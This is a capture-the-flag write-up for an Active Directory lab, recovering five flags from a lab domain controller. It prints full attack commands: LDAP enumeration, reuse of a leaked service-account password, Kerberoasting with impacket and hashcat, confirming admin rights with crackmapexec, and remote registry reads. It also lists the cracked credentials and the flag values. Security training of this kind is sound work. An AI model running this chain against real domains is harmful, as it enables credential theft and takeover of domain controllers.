# Active Directory Fundamentals — Flag Recovery Writeup

Target: `192.168.178.91` (DC01.PENTESTLAB.local, Windows Server 2019)
Tool: `ldapsearch`, `impacket` suite, `hashcat`, `crackmapexec`

This lab environment contains multiple parallel "project" structures
(`LDAP-Project`, `BH-Project`, `PV-Project`, `IT-ServiceAccounts`, etc.),
each seeded with decoy flags in the same format as the real ones
(e.g. `FLAG0{...}`, `PVFLAG0{...}`, `BHFLAG2b{...}`). Every task below
required verifying the found flag against the checker before trusting it,
since format alone (`FLAGn{64-hex-chars}`) does not guarantee correctness.

## Initial (incorrect) enumeration attempt

```bash
ldapsearch -x -H ldap://192.168.178.91 -b "OU=LDAP-Project,DC=PENTESTLAB,DC=local" -s sub "(objectClass=user)" "*" "+"
```

Flag breakdown:
- `-x` — use simple authentication (anonymous bind, no credentials supplied)
- `-H ldap://192.168.178.91` — target LDAP server
- `-b "OU=LDAP-Project,..."` — search base: start the search at this OU
- `-s sub` — scope: search this object and everything below it (subtree)
- `"(objectClass=user)"` — filter: only return objects of class `user`
- `"*" "+"` — request all standard (`*`) and operational (`+`) attributes

**Why this was insufficient:** the search base was scoped to
`OU=LDAP-Project`, so it could never see the domain root object
(`DC=PENTESTLAB,DC=local`), which is the *parent* of that OU — LDAP
searches only look downward from the base. The `(objectClass=user)`
filter also excluded the domain object itself, whose classes are
`top`, `domain`, `domainDNS`, not `user`. This command *did* return a
flag-shaped string (`FLAG0{921d2a56...}`, in Diana Reeves' `info`
attribute), but it was a decoy for Task 0 — confirmed by checker
rejection. The same hash string resurfaced later as the genuine
Task 3 answer (see below), which made it a useful landmark rather
than a dead end.

The command was also useful for mapping the lab: it revealed
account names, group memberships, and several other decoy flags
used to orient later, more targeted searches.

---

## Task 0 — Domain Reconnaissance

**Goal:** find a flag hidden in a non-standard attribute of the domain
object itself.

```bash
ldapsearch -x -H ldap://192.168.178.91 -b "DC=PENTESTLAB,DC=local" -s base "(objectClass=*)" "*" "+"
```

- `-b "DC=PENTESTLAB,DC=local"` — search base is the domain root itself
- `-s base` — scope: only this single object, not its children
- `"(objectClass=*)"` — match any object class (needed since the base
  object's classes are `domain`/`domainDNS`, not `user`)

**Result:** `description: FLAG0{518f239e03cdf54404f6bc907997efcd60863dc920ee15aa73753ec6551e}`

Two other flag-shaped strings appeared on the same object
(`displayName`, `adminDescription`) but belonged to a different
PowerView-themed lab exercise, not this task — the plain `description`
attribute was the correct one.

---

## Task 1 — Service Account Enumeration

**Goal:** find a flag left in a non-default attribute on a service
account (`svc*`).

The service accounts inside `OU=Service-Accounts,OU=LDAP-Project` had
nothing relevant even when queried for every attribute. The real
account was outside that OU entirely, discovered by widening the
search to the whole domain:

```bash
ldapsearch -x -H ldap://192.168.178.91 -b "DC=PENTESTLAB,DC=local" -s sub "(|(sAMAccountName=svc*)(objectClass=msDS-ManagedServiceAccount)(objectClass=msDS-GroupManagedServiceAccount))" "*" "+" -o ldif-wrap=no
```

- `(|(sAMAccountName=svc*)(...))` — OR filter: match any account whose
  logon name starts with `svc`, or any managed service account object
- `-o ldif-wrap=no` — disable line-wrapping in the output, so long
  attribute values (like flags) print on a single line instead of
  being split across a continuation line

**Result:** `CN=SvcBackup,OU=ServiceAccts,DC=PENTESTLAB,DC=local`
(`sAMAccountName: svc.backup`), plain `description` attribute:
`FLAG1{747fb213581c9cd487fc6e77bf4e54aa6321839fe023b0551ceef706cbc6}`

This same sweep also surfaced other `svc_*` accounts belonging to
different lab projects (`BH-`, `PV-`, `IT-ServiceAccounts`), each with
their own decoy or unrelated flags — not used for this task.

---

## Task 2 — Group Metadata Inspection

**Goal:** find a flag hidden in a non-standard attribute of a
well-known privileged group.

Anonymous bind could see the `Domain Admins` group object but **not**
its `info` attribute — that attribute was ACL-restricted to
authenticated users. The breakthrough was a leaked plaintext
credential found in an earlier full-attribute service-account dump:

```
CN=Application Service,OU=IT-ServiceAccounts,...
description: Application Service - Password: AppServ1ce!
sAMAccountName: svc_app
```

Verified with:

```bash
ldapwhoami -x -H ldap://192.168.178.91 -D "svc_app@pentestlab.local" -w 'AppServ1ce!'
```

Then re-ran the group enumeration authenticated:

```bash
ldapsearch -x -H ldap://192.168.178.91 -D "svc_app@pentestlab.local" -w 'AppServ1ce!' -b "DC=PENTESTLAB,DC=local" -s sub "(objectClass=group)" info -o ldif-wrap=no | grep '^info:'
```

- `-D` — bind DN (the account to authenticate as, here given as a UPN)
- `-w` — bind password

**Result:** `CN=Domain Admins,CN=Users,DC=PENTESTLAB,DC=local`,
`info: FLAG2{5b71afb34d4d0173498aa18c78cece76b07c58b05c8cbd54252050cf7421}`

---

## Task 3 — Registry Investigation

**Goal:** find a flag in a custom registry key under
`HKLM\SOFTWARE` on the domain controller.

This required actual local-admin rights on the DC, not just a valid
domain account — `svc_app` could authenticate to LDAP but was denied
when attempting to read the registry remotely. Local admin was
obtained via Kerberoasting.

**1. Request Kerberos service tickets for every SPN-registered account:**

```bash
impacket-GetUserSPNs 'pentestlab.local/svc_app:AppServ1ce!' -dc-ip 192.168.178.91 -request -outputfile spn_hashes.txt
```

Any authenticated domain user can request a service ticket (TGS) for
any account with a Service Principal Name; the ticket is encrypted
with that service account's NTLM password hash, which can be
cracked offline without touching the domain controller again.

**2. Crack the captured hashes:**

```bash
hashcat -m 13100 spn_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

- `-m 13100` — hash mode for Kerberos 5 TGS-REP etype 23 (RC4)
  tickets, i.e. Kerberoasting hashes

Several weak passwords cracked, including `svc_backup:Password1`,
`svc_sql:Password1`, `jmartin:Baseball1`, `svc_sql2:dragonballz`,
and `svc_print:Football1`.

**3. Check which cracked account has local admin on the DC:**

```bash
crackmapexec smb 192.168.178.91 -u svc_backup -p 'Password1'
```

Output included `(Pwn3d!)`, confirming local administrator rights
(the other four cracked accounts did not have this).

**4. Enumerate the registry remotely with those credentials:**

```bash
impacket-reg 'pentestlab.local/svc_backup:Password1@192.168.178.91' query -keyName 'HKLM\SOFTWARE'
```

This also auto-started the (stopped) Remote Registry service on the
target, since `svc_backup` had the rights to do so.

Among standard vendor keys (Microsoft, Google, Intel, Mozilla,
Oracle...), one custom key stood out: `HKLM\SOFTWARE\HolbertonLab`.

```bash
impacket-reg 'pentestlab.local/svc_backup:Password1@192.168.178.91' query -keyName 'HKLM\SOFTWARE\HolbertonLab'
```

**Result:** a `TaskFlag` value —
`FLAG3{921d2a56bd128240587aa7abbcad0a37fb8e5c6e091fa763754f27648fbe}`
— confirmed correct by the checker. Interestingly, this same hash
had shown up much earlier in the very first, mis-scoped search
(as a decoy `FLAG0` on Diana Reeves' `info` attribute) — a good
reminder that this lab reuses flag values across different roles
in its decoy scheme, so a matching hash format is not itself proof
of which task a flag belongs to.

A second flag-shaped value was found on Victor Hayes'
`scriptPath` attribute during this task's investigation
(`FLAG3{3e6d07c2f9b4a158d023e7c80469ba512f93d6e2c47b081a953f10827e5}`)
but was rejected by the checker — a decoy planted under a
plausible-looking common attribute.

---

## Task 4 — Hidden User Attribute Discovery

**Goal:** find a flag on a user account with an "unusual role,"
stored in a common attribute, visible only with explicit property
retrieval.

Rather than guess the attribute name, the whole authenticated user
tree was dumped and searched directly for the flag pattern:

```bash
ldapsearch -x -H ldap://192.168.178.91 -D "svc_backup@pentestlab.local" -w 'Password1' -b "DC=PENTESTLAB,DC=local" -s sub "(objectClass=user)" "*" "+" -o ldif-wrap=no > /tmp/all_users_full.txt
```

```bash
grep -B5 "FLAG4{" /tmp/all_users_full.txt
```

**Result:** `CN=Carol White`, `title: HR Manager`,
`description: FLAG4{ab312724162e30809801f7c0490f547317ba8cf3fbc243819264ddf0e52b}`

This fit the hint precisely: HR Manager was an "unusual role" among
the mostly IT/finance/security-themed accounts seeded elsewhere in
the lab, and the flag sat in the ordinary `description` attribute —
simply not something checked earlier because attention had been
focused on more obscure fields.

Clean, reproducible query (role-based, no flag value hardcoded):

```bash
ldapsearch -x -H ldap://192.168.178.91 -D "svc_backup@pentestlab.local" -w 'Password1' -b "DC=PENTESTLAB,DC=local" -s sub "(&(objectClass=user)(title=HR Manager))" cn title description -o ldif-wrap=no
```

Other `FLAG4`-shaped strings found in the same domain dump
(`employeeNumber` on Ryan Foster, `otherTelephone` on Morgan Liu,
`mobile` on the Print Service account) were decoys belonging to
other lab projects (`BHFLAG4`, `PVFLAG4`, and an unrelated `FLAG4`
variant) and were not used.

---

## Key lessons

1. **Scope and filter matter as much as credentials.** Several early
   failures were caused by searching the wrong OU or excluding the
   right object class, not by missing permissions.
2. **Anonymous bind ≠ full visibility.** Some attributes (e.g. group
   `info`) are ACL-restricted and only appear once authenticated.
3. **This lab plants decoy flags** in the same format as real ones,
   sometimes reusing identical hash values across different (correct
   and incorrect) locations. Every candidate flag should be verified
   against the checker before being trusted — format alone is not
   proof of correctness.
4. **Kerberoasting from a low-privilege account** was the path from
   "can read some LDAP data" to full local admin on the DC, unlocking
   registry access for Task 3.

